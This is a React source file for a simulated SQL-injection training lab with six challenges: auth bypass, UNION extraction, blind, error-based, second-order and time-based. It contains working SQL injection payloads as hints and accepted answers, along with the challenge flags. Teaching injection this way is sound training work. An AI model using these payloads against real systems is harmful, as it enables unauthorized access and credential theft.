import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";
import { useTheme } from "@/hooks/useTheme";
import LabCompletionOverlay, { type LabCompletionConfig } from "@/pages/labs/components/LabCompletionOverlay";

type Challenge = {
  id: number;
  title: string;
  category: string;
  description: string;
  theory: string;
  hint: string;
  query: string;
  successPayload: string[];
  table: Record<string, string>[];
  columns: string[];
  flag: string;
};

const challenges: Challenge[] = [
  {
    id: 1,
    title: "Classic Auth Bypass",
    category: "Authentication",
    description: "A login form checks the database with a simple unsanitized query. Bypass authentication without knowing the password.",
    theory: "The login query is built by directly concatenating user input. By injecting SQL syntax, you can make the WHERE clause always evaluate to true — letting you in as any user.",
    hint: "Try adding a SQL comment to ignore the rest of the query: ' OR '1'='1 or admin'--",
    query: "SELECT * FROM users WHERE username = '{INPUT}' AND password = 'secret'",
    successPayload: ["' OR '1'='1", "' OR 1=1--", "admin'--", "' OR '1'='1'--", "' OR 1=1 --", "' or 1=1--"],
    columns: ["id", "username", "email", "role"],
    table: [
      { id: "1", username: "admin", email: "admin@corp.local", role: "ADMINISTRATOR" },
      { id: "2", username: "jsmith", email: "j.smith@corp.local", role: "USER" },
      { id: "3", username: "finance01", email: "finance@corp.local", role: "FINANCE" },
    ],
    flag: "FLAG{sql_bypass_unlocked_1337}",
  },
  {
    id: 2,
    title: "UNION-Based Data Extraction",
    category: "Data Extraction",
    description: "The product search box is vulnerable. Use a UNION SELECT to pivot into the users table and extract credentials.",
    theory: "UNION attacks let you append a second SELECT to the original query. The key rule: both queries must return the same number of columns with compatible types. You can use this to read from any table in the database.",
    hint: "Count the columns first: the original query returns 3. Try: ' UNION SELECT id, username, password FROM users--",
    query: "SELECT id, name, category FROM products WHERE name LIKE '%{INPUT}%'",
    successPayload: [
      "' UNION SELECT id, username, password FROM users--",
      "' union select id,username,password from users--",
      "x' UNION SELECT id, username, password FROM users--",
      "' UNION SELECT id,username,password FROM users--",
    ],
    columns: ["id", "username", "password"],
    table: [
      { id: "1", username: "admin", password: "5f4dcc3b5aa765d61d8327deb882cf99" },
      { id: "2", username: "jsmith", password: "d8578edf8458ce06fbc5bb76a58c5ca4" },
      { id: "3", username: "sysadmin", password: "0d107d09f5bbe40cade3de5c71e9e9b7" },
    ],
    flag: "FLAG{union_extraction_mastered}",
  },
  {
    id: 3,
    title: "Boolean Blind Injection",
    category: "Blind SQLi",
    description: "No data is returned in the response — but the page behaves differently based on true/false conditions. Confirm the injection point exists.",
    theory: "Blind SQL injection occurs when the application doesn't return query results but changes its behavior based on the query outcome. Attackers infer data one bit at a time using boolean conditions (true = one response, false = another).",
    hint: "Try: 1 AND 1=1 (true — row returned) vs 1 AND 1=2 (false — no row). The difference proves injection.",
    query: "SELECT name FROM products WHERE id = {INPUT}",
    successPayload: ["1 AND 1=1", "1 AND 1=1--", "1 AND (1=1)", "1 AND 2>1", "1 and 1=1"],
    columns: ["result"],
    table: [{ result: "TRUE condition confirmed — row returned. Injection point is valid." }],
    flag: "FLAG{blind_injection_confirmed}",
  },
  {
    id: 4,
    title: "Error-Based Extraction",
    category: "Error-Based",
    description: "The application shows database errors in the response. Force an error that leaks the database version string.",
    theory: "Error-based SQLi exploits verbose database error messages. When crafted payloads cause specific errors, the DBMS may include sensitive data (like the DB version) in the error string — readable directly in the response.",
    hint: "Try causing a type conversion error: ' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- or ' AND 1=CONVERT(int, @@version)--",
    query: "SELECT * FROM products WHERE id = '{INPUT}'",
    successPayload: [
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
      "' and extractvalue(1,concat(0x7e,version()))--",
      "' AND 1=CONVERT(int, @@version)--",
      "' AND 1=convert(int,@@version)--",
    ],
    columns: ["error_output"],
    table: [{ error_output: "ERROR 1105: XPATH syntax error: '~8.0.32-MySQL Community Server'" }],
    flag: "FLAG{error_leaks_db_version}",
  },
  {
    id: 5,
    title: "Second-Order Injection",
    category: "Advanced",
    description: "Your injected payload is stored safely in the DB now — but executed unsafely later when the profile is loaded. Trigger it on the profile page.",
    theory: "Second-order (stored) SQLi occurs when malicious input is safely inserted into the database, but later retrieved and used in an unsafe SQL query without proper escaping. The injection fires during a different operation — making it harder to detect.",
    hint: "Register with username: admin'-- (the payload is stored, then injected into the profile query). Submit exactly: admin'--",
    query: "SELECT * FROM users WHERE username = '{INPUT}' [stored, then reused in profile query]",
    successPayload: ["admin'--", "admin' --", "ADMIN'--"],
    columns: ["id", "username", "email", "is_admin"],
    table: [
      { id: "1", username: "admin", email: "admin@corp.local", is_admin: "1" },
    ],
    flag: "FLAG{second_order_injection_ftw}",
  },
  {
    id: 6,
    title: "Time-Based Blind Injection",
    category: "Blind SQLi",
    description: "The application returns identical responses regardless of the query result. Use time delays to infer data — if the DB sleeps, the injection worked.",
    theory: "Time-based blind SQLi is used when there is no visible difference in responses. The attacker injects a conditional time delay (e.g. SLEEP(5)). If the response takes longer, the condition was true. This allows character-by-character data extraction — very slow but highly reliable.",
    hint: "Try: 1; WAITFOR DELAY '0:0:3'-- or 1 AND SLEEP(3)-- — if it 'takes longer', injection is confirmed.",
    query: "SELECT * FROM orders WHERE user_id = {INPUT}",
    successPayload: [
      "1 AND SLEEP(3)--",
      "1 and sleep(3)--",
      "1; WAITFOR DELAY '0:0:3'--",
      "1 AND SLEEP(1)--",
      "1 AND 1=1 AND SLEEP(2)--",
    ],
    columns: ["result"],
    table: [{ result: "Response delayed 3s — TIME-BASED BLIND INJECTION CONFIRMED." }],
    flag: "FLAG{time_blind_mastery_2026}",
  },
];

function SqlTerminal({ challenge, onSolve, isDark }: { challenge: Challenge; onSolve: () => void; isDark: boolean }) {
  const { t } = useTranslation();
  const [input, setInput] = useState("");
  const [result, setResult] = useState<{ type: "idle" | "success" | "error" | "empty"; rows?: Record<string, string>[]; cols?: string[]; msg?: string }>({ type: "idle" });
  const [showFlag, setShowFlag] = useState(false);

  const bg = isDark ? "bg-[#0A0C10] border-white/10" : "bg-gray-100 border-gray-200";
  const inputBg = isDark ? "bg-[#0A0C10] border-white/10 text-white placeholder-gray-600 focus:border-[#39FF14]/40" : "bg-white border-gray-200 text-gray-800 placeholder-gray-400 focus:border-emerald-400/60";

  const run = () => {
    const val = input.trim();
    if (!val) return;
    const lc = val.toLowerCase();
    const isSuccess = challenge.successPayload.some((p) => lc.includes(p.toLowerCase()));

    if (isSuccess) {
      setShowFlag(true);
      setResult({ type: "success", rows: challenge.table, cols: challenge.columns });
      onSolve();
    } else if (lc.includes("drop") || lc.includes("truncate") || lc.includes("delete")) {
      setResult({ type: "error", msg: t("labs.sql_ddl_blocked") });
    } else if (lc.includes("'") || lc.includes("--") || lc.includes("or") || lc.includes("union") || lc.includes("and") || lc.includes("sleep") || lc.includes("waitfor") || lc.includes("extractvalue") || lc.includes("convert")) {
      setResult({ type: "empty", msg: t("labs.sql_injection_failed") });
    } else {
      setResult({ type: "empty", msg: t("labs.sql_query_empty") });
    }
  };

  const liveQuery = challenge.query.replace("{INPUT}", input || "...");

  return (
    <div className="space-y-4">
      <div className={`border rounded-xl p-4 ${bg}`}>
        <p className={`text-[10px] font-mono mb-2 tracking-wider ${isDark ? "text-gray-500" : "text-gray-400"}`}>{t("labs.sql_generated_query")}</p>
        <code className={`text-xs font-mono leading-relaxed break-all ${isDark ? "text-[#00F5FF]" : "text-[#00A8B0]"}`}>
          {liveQuery}
        </code>
      </div>

      <div className="flex flex-col sm:flex-row gap-2 sm:gap-3">
        <input
          type="text"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && run()}
          placeholder={t("labs.sql_payload_placeholder")}
          className={`flex-1 border rounded-xl px-4 py-3 text-sm font-mono focus:outline-none ${inputBg}`}
        />
        <button
          onClick={run}
          className={`w-full sm:w-auto px-6 py-3 border text-sm font-bold rounded-xl transition-colors cursor-pointer whitespace-nowrap ${isDark ? "bg-[#39FF14]/10 border-[#39FF14]/30 text-[#39FF14] hover:bg-[#39FF14]/20" : "bg-emerald-50 border-emerald-300 text-emerald-700 hover:bg-emerald-100"}`}
        >
          {t("labs.execute")}
        </button>
      </div>

      {result.type !== "idle" && (
        <div className={`rounded-xl border overflow-hidden ${
          result.type === "success" ? (isDark ? "border-[#39FF14]/30" : "border-emerald-300") :
          result.type === "error" ? "border-red-500/30" :
          isDark ? "border-white/10" : "border-gray-200"
        }`}>
          {result.type === "success" && result.rows && result.cols ? (
            <>
              <div className={`px-4 py-2 border-b flex items-center gap-2 ${isDark ? "bg-[#39FF14]/5 border-[#39FF14]/20" : "bg-emerald-50 border-emerald-200"}`}>
                <i className={`ri-checkbox-circle-fill text-sm ${isDark ? "text-[#39FF14]" : "text-emerald-600"}`} />
                <span className={`text-xs font-bold font-mono ${isDark ? "text-[#39FF14]" : "text-emerald-700"}`}>{t("labs.sql_injection_success")} — {result.rows.length} {t("labs.sql_rows_returned")}</span>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full text-xs font-mono">
                  <thead>
                    <tr className={`border-b ${isDark ? "border-white/5" : "border-gray-100"}`}>
                      {result.cols.map((c) => (
                        <th key={c} className={`text-left px-4 py-2 font-normal ${isDark ? "text-gray-500" : "text-gray-400"}`}>{c}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {result.rows.map((row, i) => (
                      <tr key={i} className={`border-b last:border-0 ${isDark ? "border-white/5" : "border-gray-100"}`}>
                        {result.cols!.map((c) => (
                          <td key={c} className={`px-4 py-2 ${isDark ? "text-gray-300" : "text-gray-700"}`}>{row[c]}</td>
                        ))}
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </>
          ) : result.type === "error" ? (
            <div className="bg-red-500/5 px-4 py-3">
              <span className="text-red-400 text-xs font-mono">{result.msg}</span>
            </div>
          ) : (
            <div className={`px-4 py-3 ${isDark ? "bg-[#0A0C10]" : "bg-gray-50"}`}>
              <span className={`text-xs font-mono ${isDark ? "text-gray-500" : "text-gray-400"}`}>{result.msg}</span>
            </div>
          )}
        </div>
      )}

      {showFlag && (
        <div className={`border rounded-xl p-4 space-y-2 ${isDark ? "bg-[#39FF14]/5 border-[#39FF14]/30" : "bg-emerald-50 border-emerald-300"}`}>
          <p className={`text-xs font-bold font-mono tracking-wide ${isDark ? "text-[#39FF14]" : "text-emerald-700"}`}>{t("labs.challenge_complete")}</p>
          <div className={`flex items-center gap-3 rounded-lg px-4 py-2.5 ${isDark ? "bg-[#0A0C10]" : "bg-white border border-emerald-200"}`}>
            <i className={`ri-flag-2-fill ${isDark ? "text-[#39FF14]" : "text-emerald-600"}`} />
            <code className={`text-xs md:text-sm font-mono font-bold flex-1 break-all ${isDark ? "text-[#39FF14]" : "text-emerald-700"}`}>{challenge.flag}</code>
          </div>
        </div>
      )}
    </div>
  );
}

export default function SqlInjectionLab() {
  const navigate = useNavigate();
  const { t } = useTranslation();
  const { theme, toggleTheme } = useTheme();
  const isDark = theme === "dark";
  const [activeChallengeId, setActiveChallengeId] = useState(1);
  const [solved, setSolved] = useState<Set<number>>(new Set());
  const [showHint, setShowHint] = useState(false);
  const [showCompletion, setShowCompletion] = useState(false);
  const activeChallenge = challenges.find((c) => c.id === activeChallengeId)!;

  useEffect(() => { setShowHint(false); }, [activeChallengeId]);

  const handleSolve = () => {
    setSolved((prev) => {
      const next = new Set([...prev, activeChallengeId]);
      if (next.size === challenges.length) {
        setTimeout(() => setShowCompletion(true), 800);
      }
      return next;
    });
  };

  const handleReplay = () => {
    setShowCompletion(false);
    setSolved(new Set());
    setActiveChallengeId(1);
  };

  const sqlConfig: LabCompletionConfig = {
    badgeLabel: t("completion.sql_badge_label"),
    title: t("completion.sql_title"),
    subtitle: t("completion.sql_subtitle"),
    score: 600,
    rankValue: t("completion.sql_rank_value"),
    accentColor: "#39FF14",
    certPrefix: t("completion.sql_cert_prefix"),
    completedCount: solved.size,
    totalCount: challenges.length,
    unitLabel: t("completion.sql_unit_label"),
    nextLabRoute: "/labs/network",
    nextLabLabel: t("completion.sql_next_lab_btn"),
    stats: [
      [t("completion.score_label"), "600"],
      [t("completion.sql_challenges_label"), t("completion.sql_challenges_value")],
      [t("completion.time_label"), new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })],
    ],
    skills: [
      { label: t("completion.sql_skill_auth"), icon: "ri-login-circle-line", color: isDark ? "text-[#00F5FF]" : "text-[#00A8B0]" },
      { label: t("completion.sql_skill_union"), icon: "ri-git-merge-line", color: "text-amber-400" },
      { label: t("completion.sql_skill_blind"), icon: "ri-eye-off-line", color: "text-rose-400" },
      { label: t("completion.sql_skill_error"), icon: "ri-error-warning-line", color: "text-orange-400" },
      { label: t("completion.sql_skill_stored"), icon: "ri-save-line", color: "text-violet-400" },
      { label: t("completion.sql_skill_time"), icon: "ri-timer-line", color: isDark ? "text-[#39FF14]" : "text-emerald-500" },
    ],
  };

  const bg = isDark ? "bg-[#0A0C10]" : "bg-[#F0F4F8]";
  const cardBg = isDark ? "bg-[#13161E] border-white/5" : "bg-white border-gray-200";
  const topBar = isDark ? "bg-[#0D0F14] border-white/5" : "bg-white border-gray-200";
  const textPrimary = isDark ? "text-white" : "text-gray-900";
  const textSecondary = isDark ? "text-gray-400" : "text-gray-500";
  const textMuted = isDark ? "text-gray-500" : "text-gray-400";

  const categoryColors: Record<string, string> = {
    Authentication: isDark ? "text-[#00F5FF] bg-[#00F5FF]/10 border-[#00F5FF]/20" : "text-[#00A8B0] bg-[#00A8B0]/10 border-[#00A8B0]/20",
    "Data Extraction": isDark ? "text-amber-400 bg-amber-400/10 border-amber-400/20" : "text-amber-600 bg-amber-50 border-amber-200",
    "Blind SQLi": isDark ? "text-rose-400 bg-rose-400/10 border-rose-400/20" : "text-rose-500 bg-rose-50 border-rose-200",
    "Error-Based": isDark ? "text-orange-400 bg-orange-400/10 border-orange-400/20" : "text-orange-500 bg-orange-50 border-orange-200",
    Advanced: isDark ? "text-violet-400 bg-violet-400/10 border-violet-400/20" : "text-violet-600 bg-violet-50 border-violet-200",
  };

  return (
    <div className={`min-h-screen ${bg} ${textPrimary}`} style={{ fontFamily: "'JetBrains Mono', monospace" }}>
      {showCompletion && (
        <LabCompletionOverlay config={sqlConfig} onReplay={handleReplay} />
      )}
      <div className={`border-b ${topBar}`}>
        <div className="max-w-6xl mx-auto px-4 md:px-6 py-3 md:py-4 flex items-center gap-3 md:gap-4">
          <div className="flex items-center gap-1.5 flex-shrink-0">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
            <div className="w-2.5 h-2.5 rounded-full bg-[#39FF14]" />
          </div>
          <span className={`text-xs font-mono hidden sm:block ${textMuted}`}>vantix — sql-injection-lab</span>
          <button
            onClick={() => navigate("/")}
            className={`flex items-center gap-2 text-xs font-mono border px-3 md:px-4 py-1.5 rounded-full cursor-pointer transition-colors whitespace-nowrap ${isDark ? "text-gray-400 hover:text-white border-white/10 hover:border-white/30" : "text-gray-500 hover:text-gray-800 border-gray-200 hover:border-gray-400"}`}
          >
            <span className="w-3 h-3 flex items-center justify-center"><i className="ri-arrow-left-line" /></span>
            {t("labs.back")}
          </button>
          <div className="ml-auto flex items-center gap-3">
            <button
              onClick={toggleTheme}
              className={`w-7 h-7 flex items-center justify-center rounded-full border cursor-pointer transition-colors ${isDark ? "border-white/10 text-gray-400 hover:text-white hover:border-white/30" : "border-gray-200 text-gray-500 hover:text-gray-800 hover:border-gray-400"}`}
              title={isDark ? t("theme.light") : t("theme.dark")}
            >
              <i className={isDark ? "ri-sun-line text-sm" : "ri-moon-line text-sm"} />
            </button>
            <div className={`flex items-center gap-2 text-[10px] font-mono ${textMuted}`}>
              <span className={isDark ? "text-[#39FF14]" : "text-emerald-600"}>{solved.size}</span>/<span>{challenges.length}</span>
              <span className="hidden sm:inline">{t("labs.solved")}</span>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 md:px-6 py-8 md:py-10">
        <div className="mb-6 md:mb-8 animate-fade-up">
          <span className={`text-[10px] font-mono tracking-widest mb-2 block ${isDark ? "text-[#39FF14]" : "text-emerald-600"}`}>{t("labs.sql_lab_badge")}</span>
          <h1 className={`text-2xl md:text-4xl font-extrabold mb-3 ${textPrimary}`}>{t("labs.sql_lab_title")}</h1>
          <p className={`text-sm leading-relaxed max-w-2xl ${textSecondary}`}>{t("labs.sql_lab_subtitle")}</p>
        </div>

        {/* Theory block */}
        <div className={`border rounded-2xl p-6 mb-8 animate-fade-up delay-200 ${cardBg}`}>
          <h2 className={`font-bold text-sm mb-3 flex items-center gap-2 ${textPrimary}`}>
            <span className={`w-5 h-5 flex items-center justify-center ${isDark ? "text-[#00F5FF]" : "text-[#00A8B0]"}`}><i className="ri-book-open-line" /></span>
            {t("labs.sql_what_is_title")}
          </h2>
          <div className={`space-y-3 text-xs leading-relaxed ${textSecondary}`}>
            <p>{t("labs.sql_what_is_p1")}</p>
            <p>{t("labs.sql_what_is_p2")}</p>
            <div className={`rounded-lg p-4 border ${isDark ? "bg-[#0A0C10] border-white/10" : "bg-gray-50 border-gray-200"}`}>
              <p className={`mb-2 text-[10px] ${textMuted}`}>{t("labs.sql_vulnerable_label")}</p>
              <code className={`text-[11px] ${isDark ? "text-[#00F5FF]" : "text-[#00A8B0]"}`}>
                {`String query = "SELECT * FROM users WHERE user='" + username + "'";`}
              </code>
            </div>
            <p>
              If <code className={`px-1 rounded ${isDark ? "text-[#39FF14] bg-[#39FF14]/10" : "text-emerald-600 bg-emerald-50"}`}>username</code> ={" "}
              <code className={`px-1 rounded ${isDark ? "text-rose-400 bg-rose-400/10" : "text-rose-500 bg-rose-50"}`}>&apos; OR &apos;1&apos;=&apos;1</code>,{" "}
              {t("labs.sql_example_desc")}
            </p>
            <p className={`text-[10px] font-mono ${isDark ? "text-amber-400" : "text-amber-600"}`}>
              ⚠ {t("labs.sql_prevention")}
            </p>
          </div>
        </div>

        {/* Progress bar */}
        <div className={`border rounded-xl px-5 py-3 mb-8 flex items-center gap-4 ${isDark ? "bg-[#13161E] border-white/5" : "bg-white border-gray-200"}`}>
          <span className={`text-[10px] font-mono ${textMuted}`}>{t("labs.progress")}</span>
          <div className={`flex-1 h-1.5 rounded-full overflow-hidden ${isDark ? "bg-white/10" : "bg-gray-200"}`}>
            <div
              className={`h-full rounded-full transition-all duration-700 ${isDark ? "bg-[#39FF14]" : "bg-emerald-500"}`}
              style={{ width: `${(solved.size / challenges.length) * 100}%`, boxShadow: isDark ? "0 0 8px #39FF14" : "none" }}
            />
          </div>
          <span className={`text-[10px] font-mono font-bold ${isDark ? "text-[#39FF14]" : "text-emerald-600"}`}>{solved.size}/{challenges.length}</span>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 md:gap-6 animate-fade-up delay-300">
          {/* Challenge list */}
          <div className="lg:col-span-1">
            <p className={`text-[10px] font-mono tracking-wider mb-3 ${textMuted}`}>{t("labs.challenges")}</p>
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-1 gap-2">
              {challenges.map((c) => (
                <button
                  key={c.id}
                  onClick={() => setActiveChallengeId(c.id)}
                  className={`w-full text-left p-3 md:p-4 rounded-xl border cursor-pointer transition-all ${
                    activeChallengeId === c.id
                      ? isDark ? "bg-[#39FF14]/5 border-[#39FF14]/30 text-white" : "bg-emerald-50 border-emerald-300 text-gray-900"
                      : isDark ? "bg-[#13161E] border-white/5 hover:border-white/10 text-gray-400 hover:text-white" : "bg-white border-gray-100 hover:border-gray-300 text-gray-500 hover:text-gray-800"
                  }`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <span className={`text-[10px] font-mono ${textMuted}`}>#{c.id}</span>
                    {solved.has(c.id) && (
                      <span className={`w-4 h-4 flex items-center justify-center ${isDark ? "text-[#39FF14]" : "text-emerald-500"}`}>
                        <i className="ri-checkbox-circle-fill text-xs" />
                      </span>
                    )}
                  </div>
                  <p className="text-xs font-semibold leading-snug">{c.title}</p>
                  <span className={`text-[9px] font-mono px-1.5 py-0.5 rounded border mt-1.5 inline-block ${categoryColors[c.category] ?? textMuted}`}>{c.category}</span>
                </button>
              ))}
            </div>
          </div>

          {/* Active challenge */}
          <div className="lg:col-span-3 space-y-5">
            <div className={`border rounded-2xl p-6 ${cardBg}`}>
              <div className="flex items-start justify-between mb-3 gap-4">
                <div>
                  <span className={`text-[10px] font-mono tracking-wider ${textMuted}`}>{t("labs.sql_challenge_label")} {activeChallenge.id} {t("labs.sql_challenge_of")} {challenges.length}</span>
                  <h3 className={`font-bold text-lg mt-0.5 ${textPrimary}`}>{activeChallenge.title}</h3>
                </div>
                {solved.has(activeChallenge.id) && (
                  <span className={`flex items-center gap-1.5 text-[10px] font-mono border px-3 py-1.5 rounded-full flex-shrink-0 ${isDark ? "text-[#39FF14] border-[#39FF14]/30 bg-[#39FF14]/5" : "text-emerald-600 border-emerald-300 bg-emerald-50"}`}>
                    <i className="ri-checkbox-circle-fill" /> {t("labs.sql_solved_badge")}
                  </span>
                )}
              </div>

              {/* Theory mini-block */}
              <div className={`rounded-lg px-4 py-3 mb-4 border-l-2 ${isDark ? "bg-[#0A0C10] border-[#00F5FF]" : "bg-[#00A8B0]/5 border-[#00A8B0]"}`}>
                <p className={`text-[10px] font-mono mb-1 ${isDark ? "text-[#00F5FF]" : "text-[#00A8B0]"}`}>{t("labs.sql_how_it_works")}</p>
                <p className={`text-xs leading-relaxed ${textSecondary}`}>{activeChallenge.theory}</p>
              </div>

              <p className={`text-sm leading-relaxed mb-5 ${textSecondary}`}>{activeChallenge.description}</p>

              <SqlTerminal key={activeChallenge.id} challenge={activeChallenge} onSolve={handleSolve} isDark={isDark} />

              <div className={`mt-5 border-t pt-5 ${isDark ? "border-white/5" : "border-gray-100"}`}>
                <button
                  onClick={() => setShowHint(!showHint)}
                  className={`flex items-center gap-2 text-xs cursor-pointer transition-colors whitespace-nowrap ${isDark ? "text-gray-500 hover:text-amber-400" : "text-gray-400 hover:text-amber-600"}`}
                >
                  <span className="w-4 h-4 flex items-center justify-center"><i className="ri-lightbulb-line" /></span>
                  {showHint ? t("labs.hide_hint") : t("labs.show_hint")}
                </button>
                {showHint && (
                  <div className={`mt-3 border rounded-lg px-4 py-3 ${isDark ? "bg-amber-400/5 border-amber-400/20" : "bg-amber-50 border-amber-200"}`}>
                    <p className={`text-xs leading-relaxed font-mono ${isDark ? "text-amber-300" : "text-amber-700"}`}>{activeChallenge.hint}</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
